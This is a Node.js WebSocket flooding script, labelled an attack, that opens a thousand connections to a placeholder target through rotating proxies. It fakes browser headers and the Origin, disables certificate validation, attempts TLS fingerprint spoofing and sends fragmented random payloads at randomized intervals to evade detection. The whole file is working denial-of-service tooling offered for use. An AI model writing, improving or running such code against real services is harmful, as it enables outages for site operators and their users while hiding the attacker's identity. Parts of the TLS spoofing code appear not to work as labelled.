const WebSocket = require('ws');
const { SocksProxyAgent } = require('socks-proxy-agent');
const fs = require('fs');
const tls = require('tls');
const crypto = require('crypto');

// ===== CONFIGURATION =====
const TARGET = "wss://target.com/ws";
const CONCURRENT_CONNECTIONS = 1000;
const PROXY_FILE = 'proxy.txt'; // Format: socks5://user:pass@ip:port or http://user:pass@ip:port
const MIN_CONNECTION_DELAY_MS = 10;
const MAX_CONNECTION_DELAY_MS = 500;
const MIN_MESSAGE_INTERVAL_MS = 50;
const MAX_MESSAGE_INTERVAL_MS = 300;
const MAX_FRAGMENT_SIZE = 16384; // 16KB fragments

// Load proxies from file
let PROXIES = [];
try {
    const proxyData = fs.readFileSync(PROXY_FILE, 'utf-8');
    PROXIES = proxyData.split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'));
    console.log(`[+] Loaded ${PROXIES.length} proxies from ${PROXY_FILE}`);
} catch (err) {
    console.error(`[!] Error loading proxy file: ${err.message}`);
    process.exit(1);
}

// User-Agents
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    // ... add more user agents ...
];

// ===== ATTACK STATISTICS =====
const stats = {
    totalConnectionsAttempted: 0,
    successfulConnections: 0,
    failedConnections: 0,
    messagesSent: 0,
    startTime: Date.now(),
    activeConnections: new Set(),
    proxiesRotated: 0,
    deadProxies: new Set()
};

// ===== PROXY ROTATION SYSTEM =====
function getNextProxy() {
    if (PROXIES.length === 0) return null;
    
    // Rotate through proxies sequentially
    const proxy = PROXIES[stats.proxiesRotated % PROXIES.length];
    stats.proxiesRotated++;
    
    return proxy;
}

function markProxyDead(proxy) {
    if (!proxy) return;
    stats.deadProxies.add(proxy);
    console.log(`[!] Marked proxy as dead: ${proxy}`);
    
    // Optional: Remove dead proxy from rotation
    // PROXIES = PROXIES.filter(p => p !== proxy);
}

// ===== MAIN ATTACK CODE =====
async function launchAttack() {
    console.log(`[+] Starting advanced attack with ${PROXIES.length} proxies`);
    
    for (let i = 0; i < CONCURRENT_CONNECTIONS; i++) {
        const delay = getRandomInterval(MIN_CONNECTION_DELAY_MS, MAX_CONNECTION_DELAY_MS);
        setTimeout(() => createBot(i), i * delay);
    }
}

// ===== BOT CREATION =====
function createBot(botId) {
    stats.totalConnectionsAttempted++;
    const connectionId = `${botId}-${stats.totalConnectionsAttempted}`;
    
    const proxyUrl = getNextProxy();
    let agent = null;
    
    try {
        if (proxyUrl) {
            agent = new SocksProxyAgent(proxyUrl, {
                timeout: 10000,
                keepAlive: true
            });
        }
    } catch (err) {
        console.error(`[!] Proxy error (${proxyUrl}): ${err.message}`);
        markProxyDead(proxyUrl);
        return;
    }
    
    const wsOptions = {
        headers: {
            "User-Agent": getRandomUserAgent(),
            "Origin": "https://google.com",
            "Accept-Language": "en-US,en;q=0.9"
        },
        agent: agent,
        handshakeTimeout: 15000,
        rejectUnauthorized: false
    };
    
    // TLS fingerprint spoofing
    wsOptions.createConnection = (defaultCreateConnection) => {
        return (options) => {
            const socket = defaultCreateConnection(options);
            socket.setMaxSendFragment(MAX_FRAGMENT_SIZE);
            return Object.assign(socket, {
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384',
                honorCipherOrder: true,
                minVersion: 'TLSv1.2'
            });
        };
    };
    
    const ws = new WebSocket(TARGET, wsOptions);
    stats.activeConnections.add(connectionId);
    
    ws.on('open', () => {
        stats.successfulConnections++;
        console.log(`[+] ${connectionId} connected via ${proxyUrl || 'DIRECT'}`);
        
        const sendPayload = () => {
            if (ws.readyState !== ws.OPEN) return;
            
            try {
                // Generate random payload
                const payload = {
                    attackId: connectionId,
                    timestamp: Date.now(),
                    data: crypto.randomBytes(64).toString('hex')
                };
                
                // Fragment and send
                const fragments = fragmentMessage(JSON.stringify(payload));
                fragments.forEach((frag, i) => {
                    setTimeout(() => {
                        if (ws.readyState === ws.OPEN) {
                            ws.send(frag, { fin: i === fragments.length - 1 });
                            stats.messagesSent++;
                        }
                    }, i * 15); // Stagger fragments
                });
                
                // Schedule next message with random delay
                setTimeout(sendPayload, getRandomInterval(MIN_MESSAGE_INTERVAL_MS, MAX_MESSAGE_INTERVAL_MS));
            } catch (err) {
                console.error(`[!] ${connectionId} send error:`, err.message);
            }
        };
        
        // Start message loop
        setTimeout(sendPayload, getRandomInterval(0, 1000));
    });
    
    ws.on('error', (err) => {
        stats.failedConnections++;
        console.error(`[!] ${connectionId} error via ${proxyUrl || 'DIRECT'}:`, err.message);
        if (proxyUrl) markProxyDead(proxyUrl);
        stats.activeConnections.delete(connectionId);
    });
    
    ws.on('close', () => {
        stats.activeConnections.delete(connectionId);
        console.log(`[-] ${connectionId} disconnected`);
    });
}

// ===== UTILITY FUNCTIONS =====
function getRandomUserAgent() {
    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function getRandomInterval(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function fragmentMessage(message) {
    const fragments = [];
    for (let i = 0; i < message.length; i += MAX_FRAGMENT_SIZE) {
        fragments.push(message.substring(i, i + MAX_FRAGMENT_SIZE));
    }
    return fragments;
}

// ===== STATS REPORTING =====
setInterval(() => {
    const duration = (Date.now() - stats.startTime) / 1000;
    console.log(`
=== ATTACK STATS ===
Duration: ${duration.toFixed(1)}s
Connections: ${stats.successfulConnections}/${stats.totalConnectionsAttempted} (${stats.failedConnections} failed)
Active: ${stats.activeConnections.size}
Messages: ${stats.messagesSent} (${(stats.messagesSent/duration).toFixed(1)}/sec)
Proxies: ${stats.proxiesRotated} rotations, ${stats.deadProxies.size} dead
    `);
}, 5000);

// Start the attack
launchAttack().catch(console.error);

// Clean exit handler
process.on('SIGINT', () => {
    console.log('\n[!] Stopping attack...');
    console.log('=== FINAL STATS ===');
    console.log(stats);
    process.exit();
});
